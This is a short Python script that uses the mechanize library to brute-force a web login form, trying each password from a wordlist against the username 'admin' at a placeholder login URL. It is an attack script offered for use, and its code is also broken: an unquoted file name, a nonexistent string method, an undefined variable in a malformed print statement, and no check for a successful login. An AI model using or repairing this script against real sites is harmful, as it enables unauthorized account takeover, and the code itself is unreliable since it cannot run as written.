import mechanize
b = mechanize.Browser()

url = "example.com/login.php"
wordlist = wordlist.txt

try:
        wordlist = open(wordlist, "r")
except:
        print "\nWordlist Not found !"
        quit()

for password in wordlist:
        response = b.open(url)
        b.select_form(nr=0)

        b.form['username'] = 'admin'
        b.form['password'] = password.string()
        b.method = 'POST'
        response = b.submit()

        print Password found ! : word.strip()
